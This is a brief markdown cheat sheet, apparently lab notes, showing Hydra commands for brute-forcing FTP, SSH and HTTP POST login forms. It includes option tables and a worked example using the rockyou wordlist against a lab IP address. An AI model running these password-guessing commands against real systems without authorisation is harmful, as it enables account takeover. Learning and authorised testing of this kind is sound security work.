brute force passwords

## FTP

``` bash
hydra -l user -P passlist.txt ftp://MACHINE_IP

```

## SSH

``` bash
hydra -l <username> -P <full path to pass> 10.48.172.211 -t 4 ssh

```

|Option|Description|
|---|---|
|`-l`|specifies the (SSH) username for login|
|`-P`|indicates a list of passwords|
|`-t`|sets the number of threads to spawn|

## POST Web Form
``` bash
sudo hydra <username> <wordlist> 10.48.172.211 http-post-form "<path>:<login_credentials>:<invalid_response>"

hydra -l <username> -P <wordlist> 10.48.172.211 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

#ff the web server is listening on a non-default port number, you can explicitly specify the port number
hydra -l <username> -P <wordlist> 10.48.172.211 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```

|Option|Description|
|---|---|
|`-l`|the username for (web form) login|
|`-P`|the password list to use|
|`http-post-form`|The type of the form is POST|
|`<path>`|the login page URL, for example, `login.php`|
|`<login_credentials>`|the username and password used to log in, for example, `username=^USER^&password=^PASS^`|
|`<invalid_response>`|part of the response when the login fails|
|`-V`|verbose output for every attempt|

## Examples
``` bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.48.172.211 http-post-form "/login:username=^USER^&password=^PASS^:incorrect" -V


```